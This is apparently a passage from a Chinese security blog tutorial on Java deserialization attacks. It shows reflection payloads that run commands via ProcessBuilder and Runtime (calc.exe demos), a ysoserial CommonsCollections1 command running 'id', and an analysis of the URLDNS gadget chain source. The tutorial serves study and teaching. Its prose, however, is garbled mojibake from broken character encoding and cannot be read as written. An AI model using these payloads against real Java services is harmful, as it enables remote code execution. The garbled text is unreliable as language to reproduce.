<h3 id="åˆ©ç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤"></a><strong>åˆ©ç”¨<code>ProcessBuilder</code>æ‰§è¡Œå‘½ä»¤</strong></h3><p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³•<code>getConstructor</code>ã€‚</p>
<p>å’ŒgetMethodç±»ä¼¼ï¼Œ<code>getConstructor</code>æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°çš„çš„åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œæ‰€ä»¥è¦ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°</p>
<p>æ¯”å¦‚æˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶å è°ƒç”¨<code>start()</code>æ¥æ‰§è¡Œå‘½ä»¤</p>
<p><strong>ProcessBuilder:</strong></p>
<p>ProcessBuilderç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨å…¶ä¸­çš„startæ–¹æ³•æ¥å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£æˆå½“<code>getRuntime</code>è¢«ç¦ç”¨æ—¶ï¼Œå¯ä»¥ç”¨<code>ProcessBuilder</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><code>ProcessBuilder</code>æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š</p>
<ul>
<li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li>
<li><code>public ProcessBuilder(String... commang)</code></li>
</ul>
<p>æˆ‘ä»¬ç”¨<code>ProcessBuilder</code>å†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder");</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>é¦–å…ˆåˆ©ç”¨åå°„è·å–<code>ProcessBuilder</code>ç±»ï¼›</li>
<li>è·å–clazz(ProcessBuilder)å½¢å‚åˆ—è¡¨ä¸º<code>List&lt;String&gt; command</code>çš„æ„é€ å‡½æ•°ï¼›</li>
<li>å°†è·å–åˆ°çš„æ„é€ å‡½æ•°åˆ©ç”¨newInstanceè¿›è¡Œå®ä¾‹åŒ–ï¼Œè°ƒç”¨æ„é€ å‡½æ•°ï¼›</li>
<li>å¯¹æ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º <code>calc.exe</code>ï¼Œå¹¶ä¸”ç”¨<code>Arrays.asList</code>æ–¹æ³•å°†è¦æ‰§è¡Œçš„å‘½ä»¤è½¬ä¸ºListç±»å‹ï¼›</li>
<li>è¿”å›Listç±»å‹çš„<code>command</code>ï¼› <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png"> <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png"><ol>
<li>å°†Listç±»å‹çš„commandå¼ºåˆ¶è½¬æ¢ä¸º<code>ProcessBuilder</code>ç±»å‹ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨<code>ProcessBuilder</code>ä¸­çš„startæ–¹æ³•æ‰“å¼€<code>calc.exe</code>è¿›ç¨‹ã€‚ <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png"></li>
</ol>
 å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•éœ€è¦ç”¨åˆ°å¼ºè½¬ï¼Œä½†æœ‰æ—¶å€™åœ¨åˆ©ç”¨æ¼æ´æ—¶å¹¶æ²¡æœ‰è¿™ç§è¯­æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€åˆ©ç”¨åå°„æ¥å®Œæˆè¿™ä¸€æ­¥ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder"); clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ol>
<li>forNameè·å–ç±»ï¼›</li>
<li>è·å–clazzä¸­çš„<code>start</code>æ–¹æ³•ï¼›</li>
<li>ç”¨invokeæ‰§è¡Œstartæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ç”¨invokeæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¦æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨ç±»çš„å¯¹è±¡ï¼Œä½†clazzä¸­æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½æ˜¯<code>clazz.newInstance</code>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ¢ä¸ªæ–¹æ³•ï¼Œé€šè¿‡<code>getConstructor</code>è·å–åˆ°<code>ProcessBuilder</code>çš„æ„é€ å‡½æ•°ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæ„é€ å‡½æ•°<code>newInstance</code>ï¼Œåœ¨å®ä¾‹åŒ–çš„åŒæ—¶å¯¹æ„é€ æ–¹æ³•ä¼ å…¥å‚æ•°<code>calc.exe</code>ï¼Œå› ä¸ºæˆ‘ä»¬åˆšæ‰æåˆ°äº†<code>ProcessBuilder</code>æ˜¯æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°çš„ï¼Œæ‰€ä»¥åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å¿…é¡»è¦ä¼ å…¥å‚æ•°ã€‚ï¼ˆè¿™é‡Œè·å–çš„æ„é€ æ–¹æ³•ä¾ç„¶æ˜¯ä¸Šé¢æåˆ°çš„å½¢å‚åˆ—è¡¨ä¸ºListçš„æ„é€ å‡½æ•°ï¼‰</li>
</ol>
 é‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹<code>ProcessBuilder</code>çš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼š <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png"> æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¸º<code>String... command</code>ï¼Œè¿™ä¸ªå‚æ•°åˆ—è¡¨çš„æ„æ€å…¶å®å°±æ˜¯å‚æ•°æ•°é‡å¯å˜åˆ—è¡¨ï¼Œå½“æˆ‘ä»¬åœ¨å†™ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œä¸çŸ¥é“è¦ä¼ å…¥å¤šå°‘å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™æˆ<code>Type... Args</code>çš„æ–¹å¼ï¼Œå…¶å®åœ¨åº•å±‚æ¥çœ‹<code>String... command</code>è¿™æ ·çš„å†™æ³•å°±ç­‰æ•ˆäº<code>String[] command</code>ï¼Œç›¸å½“äºä¼ å…¥äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ æ¯”å¦‚æœ‰ä¸€ä¸ªhelloæ–¹æ³•ï¼š <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void hello(String...names){}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„æƒ³ä¼ ç»™y1æ–¹æ³•ï¼Œåªéœ€è¦ç›´æ¥ä¼ å°±è¡Œï¼š <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] names = {"hello", "world"};</span><br><span class="line">hello(names)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–åˆ°å‚æ•°åˆ—è¡¨ä¸º<code>String... command</code> çš„è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨<code>getConstructor</code>æ—¶è¦ä¼ å…¥çš„å‚æ•°ä¸º<code>String[].class</code>ï¼Œåœ¨è°ƒç”¨newInstanceæ—¶ï¼Œå› ä¸ºè¿™ä¸ªæ„é€ æ–¹æ³•æœ¬èº«æ¥å—çš„å°±æ˜¯ä¸€ä¸ªå¯å˜é•¿æ•°ç»„ï¼Œæˆ‘ä»¬åœ¨ä¼ å…¥æ—¶ä¹Ÿä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„ï¼Œå› æ­¤å åŠ èµ·æ¥æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•çš„payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder");</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{"calc.exe"}})).start();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ol>
<li>åå°„æ‹¿åˆ°ç±»ï¼›</li>
<li><code>getConstructor</code>æ‹¿åˆ°å‚æ•°åˆ—è¡¨ä¸º<code>String... command</code>çš„æ„é€ æ–¹æ³•ï¼›</li>
<li><code>newInstance</code>è§¦å‘è¯¥æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥ä¸€ä¸ªäºŒç»´å­—ç¬¦æ•°ç»„ï¼›</li>
<li>ç”±äºè¿”å›çš„commandæ˜¯å­—ç¬¦æ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥å¼ºè½¬ä¸º<code>ProcessBuilder</code>å¹¶ç”¨<code>start()</code>æ–¹æ³•è§¦å‘ï¼›</li>
</ol>
</li>
</ol>
<h3 id="å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•"><a href="#å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•" class="headerlink" title="å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•"></a>å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•</h3><p>å†å›åˆ°ç¬¬äºŒä¸ªé—®é¢˜ä¸Šï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯privateï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</p>
<p>è¿™é‡Œå°±è¦ç”¨åˆ°<code>getDeclared</code>ç³»åˆ—çš„åå°„äº†ï¼Œä¸æ™®é€šçš„<code>getMethodï¼ŒgetConstructor</code>åŒºåˆ«æ˜¯ï¼š</p>
<ul>
<li><code>getMethod</code>ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼›</li>
<li><code>getDeclaredMethod</code>ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†</li>
</ul>
<p>åœ¨ç”¨æ³•ä¸Š<code>getDeclaredMethod</code>çš„å…·ä½“ç”¨æ³•ä¸<code>getMethod</code>ç±»ä¼¼ï¼Œ<code>getDeclaredConstructor</code>çš„å…·ä½“ç”¨æ³•å’Œ<code>getConstructor</code>ç±»ä¼¼</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡Runtimeçš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡<code>Runtime.getRuntime()</code>æ¥è·å–å¯¹è±¡ï¼Œå…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨<code>getDeclaredConstructor</code>æ¥è·å–è¿™ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.Runtime");</span><br><span class="line">        Constructor m =clazz.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(true);</span><br><span class="line">        clazz.getMethod("exec",String.class).invoke(m.newInstance(), "calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬åœ¨è·å–åˆ°ç§æœ‰æ–¹æ³•åï¼Œè¦ç”¨<code>setAccessible()</code>æ–¹æ³•ä½¿è¿™ä¸ªç§æœ‰æ–¹æ³•å¯ä»¥è¢«è®¿é—®ï¼Œå…¶ä»–çš„å°±å’Œä¹‹å‰ä»‹ç»çš„åå°„ä¸€æ ·äº†ï¼Œå¦‚æœä¸ç”¨<code>setAccessible()</code>æ–¹æ³•ä¿®æ”¹ä½œç”¨åŸŸè¿™ä¸ªæ–¹æ³•æ˜¯ä»ç„¶ä¸èƒ½è°ƒç”¨çš„</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a><strong>ysoserial</strong></h2><p>åœ¨ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé›†æˆäº†javaååºåˆ—åŒ–å„ç§gadget chainsï¼ˆåˆ©ç”¨é“¾ï¼‰çš„å·¥å…·ï¼Œ<a class="link" target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial<i class="fas fa-external-link-alt"></i></a>ã€‚</p>
<p>ysoserialä¸‹è½½å¥½åè¿˜éœ€è¦å†å®‰è£…ä¸€äº›å…¶ä»–çš„ä¾èµ–ï¼Œæ•™ç¨‹ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œæˆ‘å°±ä¸ç»†è¯´äº†ï¼Œæˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹ysoserialä¸­ä¸€äº›æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ã€‚</p>
<p>é¦–å…ˆæ˜¯åºåˆ—åŒ–ï¼ˆSerializeï¼‰ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png"></p>
<p>è¿™ä¸ªåºåˆ—åŒ–æ“ä½œå’Œæˆ‘ä¹‹å‰æåˆ°çš„åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå°†ä¸€ä¸ªå¯¹è±¡ä»¥å­—èŠ‚æµçš„å½¢å¼è¾“å‡ºå¹¶ä¿å­˜ï¼Œå¹¶è§¦å‘å®ƒçš„writeObjectã€‚</p>
<p>ååºåˆ—åŒ–ï¼ˆUnserialize å†ysoserialä¸­å«Deserializeï¼‰ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png"></p>
<p>å°†ä¸€ä¸ªå­—èŠ‚æµè¯»å…¥è¿˜åŸä¸ºå¯¹è±¡å¹¶è§¦å‘å®ƒçš„readObjectã€‚</p>
<p>Payloadrunnerï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨Payloadrunnerä¸­ï¼Œå…ˆå°†å¯¹è±¡åºåˆ—åŒ–å†ååºåˆ—åŒ–ï¼Œå…¶å®å°±æ˜¯ç”¨æ¥è¿è¡Œæˆ‘ä»¬çš„é“¾ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„payloadï¼Œå…·ä½“æ‰§è¡Œå‘½ä»¤ï¼ˆç”¨ccé“¾ä¸¾ä¾‹ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 "id"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>å¦‚æœæˆ‘ä»¬ç›´æ¥å†intellijä¸­è¿è¡Œè¿™äº›é“¾ï¼Œä¸ä¼šå‡ºç°payloadï¼Œå¹¶ä¸”è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨javaååºåˆ—åŒ–ä¸­å‡ ä¹æˆ‘ä»¬ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤çš„ç»“æœæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ä¸€äº›æ¯”è¾ƒæ˜æ˜¾çš„å‘½ä»¤è®©æˆ‘ä»¬çŸ¥é“è¿™ä¸ªé“¾å­è¢«æˆåŠŸè§¦å‘äº†ï¼Œåœ¨ysoserialä¸­æˆ‘ä»¬ä¸€èˆ¬ç”¨è®¡ç®—å™¨<code>calc.exe</code>ï¼Œä¸€èˆ¬æ¥è¯´ysoserialå®‰è£…å¥½åpayloadé»˜è®¤çš„å‚æ•°æ˜¯<code>calc.exe</code>ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±è¦è‡ªå·±æ‰‹åŠ¨è®¾ç½®é»˜è®¤å‚æ•°äº†ï¼Œå…·ä½“çš„æˆ‘å°±ä¸å¤šè¯´äº†ã€‚</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a><strong>URLDNS</strong></h2><p>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ï¼Œ<code>URLDNS</code>ï¼Œè¿™æ¡é“¾å­çš„åˆ©ç”¨é“¾å¾ˆçŸ­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ysoserialä¸­çš„ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public class URLDNS implements ObjectPayload&lt;Object&gt; {</span><br><span class="line"></span><br><span class="line">        public Object getObject(final String url) throws Exception {</span><br><span class="line"></span><br><span class="line">                //Avoid DNS resolution during payload creation</span><br><span class="line">                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">                URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">                URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception {</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="line">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="line">         * using the serialized object.&lt;/p&gt;</span><br><span class="line">         *</span><br><span class="line">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="line">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="line">         * second resolution.&lt;/p&gt;</span><br><span class="line">         */</span><br><span class="line">        static class SilentURLStreamHandler extends URLStreamHandler {</span><br><span class="line"></span><br><span class="line">                protected URLConnection openConnection(URL u) throws IOException {</span><br><span class="line">                        return null;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                protected synchronized InetAddress getHostAddress(URL u) {</span><br><span class="line">                        return null;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>ä¸€ç‚¹ç‚¹åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆä»URLçš„åˆ›å»ºå¼€å§‹ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">                URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>å…ˆæ˜¯ç”¨<code>URLStreamHandler</code>cåˆ›å»ºäº†ä¸€ä¸ªå¥æŸ„ï¼Œè¿™ä¸ªå¥æŸ„å¯ä»¥æ‰“å¼€ä¸€ä¸ªæŒ‡å®šçš„urlã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¹¶å°†urlå¯¹è±¡uä½œä¸ºkeyå­˜å…¥åˆ°äº†å“ˆå¸Œè¡¨ä¸­ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception {</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>è¿™é‡Œå°†urlå¯¹è±¡uçš„hashCodeè®¾ç½®æˆäº†-1ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšæˆ‘ä»¬ä¸€ä¼šåœ¨åˆ†æå…·ä½“çš„è§¦å‘è¿‡ç¨‹æ—¶ä¼šæåˆ°ã€‚</li>
<li>è¿”å›äº†å“ˆå¸Œè¡¨å¯¹è±¡htï¼Œå¹¶ç”¨PayloadRunnerè¿è¡Œè¯¥åˆ©ç”¨é“¾ã€‚</li>
</ul>
<p>è¿™æ®µä»£ç å°±å¹²äº†è¿™äº›äº‹ï¼Œé‚£ä¹ˆæ˜¯æ€ä¹ˆè§¦å‘ååºåˆ—åŒ–çš„å‘¢ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘readObjectï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å»çœ‹Hashmapçš„readObjectæ–¹æ³•ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png"></p>
<p>æœ€é‡è¦çš„ä¸€è¡Œå°±æ˜¯æœ€åçš„<code>putValue</code>ï¼Œé‡Œé¢è®¡ç®—äº†å“ˆå¸Œè¡¨çš„é”®åã€‚æˆ‘ä»¬è·Ÿä¸€ä¸‹<code>putValue</code>æ–¹æ³•ï¼Œå‘ç°åˆ©ç”¨hashæ–¹æ³•è®¡ç®—äº†å“ˆå¸Œè¡¨çš„keyã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png"></p>
<p>æˆ‘ä»¬å†ç»§ç»­è·Ÿè¿›hashæ–¹æ³•ï¼Œå‘ç°è¿™é‡Œè°ƒç”¨äº†å“ˆå¸Œè¡¨keyçš„hashcodeæ–¹æ³•ï¼Œæˆ‘ä»¬å›åˆ°åˆšæ‰åˆ›å»ºå“ˆå¸Œè¡¨æ—¶ï¼Œæ˜¯æŠŠurlå¯¹è±¡å­˜å…¥åˆ°äº†keyä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»æ‰¾<code>java.net.URL</code>çš„<code>hashCode</code>æ–¹æ³•ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png"></p>
<p>å¦‚æœhashCodeå€¼ä¸ä¸º-1ï¼Œé‚£ä¹ˆå°±ä¼šreturnï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°è¦å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1çš„åŸå› ã€‚</p>
